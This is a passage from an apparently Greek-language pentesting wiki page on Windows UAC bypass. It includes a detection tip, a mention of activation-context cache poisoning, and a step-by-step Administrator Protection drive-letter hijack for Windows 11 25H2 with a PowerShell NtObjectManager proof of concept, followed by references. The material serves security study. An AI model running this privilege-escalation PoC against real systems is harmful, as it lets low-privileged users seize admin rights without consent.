- Συσχετίστε τις εκκινήσεις του `iscsicpl.exe` με μη αναμενόμενες child processes ή DLL loads εκτός των κανονικών Windows directories.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά `HKCU\Software\Classes` registry hijacks. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και ένα **DLL redirection**, ώστε να μεταβεί από medium σε high integrity μέσω trusted UI / auto-elevated binaries όπως το `ctfmon.exe` και, αργότερα, targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα σύντομα payload examples στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack μέσω per-logon-session DOS device map

Για ολόκληρη την επιφάνεια επίθεσης `RAiLaunchAdminProcess` / UIAccess στο Windows 11 25H2, ελέγξτε την ειδική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το Windows 11 25H2 “Administrator Protection” χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Ο κατάλογος δημιουργείται lazily από το `SeGetTokenDeviceMap` κατά την πρώτη ανάλυση του `\??`. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, ο κατάλογος δημιουργείται με τον attacker ως **owner** (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.

**Βήματα:**

1. Από μια low-privileged session, καλέστε το `RAiProcessRunOnce` για να εκκινήσετε ένα promptless shadow-admin `runonce.exe`.
2. Αντιγράψτε το primary token του σε token επιπέδου **identification** και κάντε impersonate σε αυτό κατά το άνοιγμα του `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` υπό την ιδιοκτησία του attacker.
3. Δημιουργήστε ένα `C:` symlink εκεί, το οποίο δείχνει σε storage που ελέγχεται από τον attacker· οι επόμενες filesystem accesses σε εκείνη τη session θα επιλύουν το `C:` προς το path του attacker, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Συλλογή τεχνικών UAC bypass](https://github.com/hfiref0x/UACME)
- [WinPwnage – Scanner συμβατότητας και launcher για UAC bypass](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Παράκαμψη της προστασίας διαχειριστών των Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Παράκαμψη της προστασίας διαχειριστών μέσω κατάχρησης του UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – UAC bypass με χρήση του SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
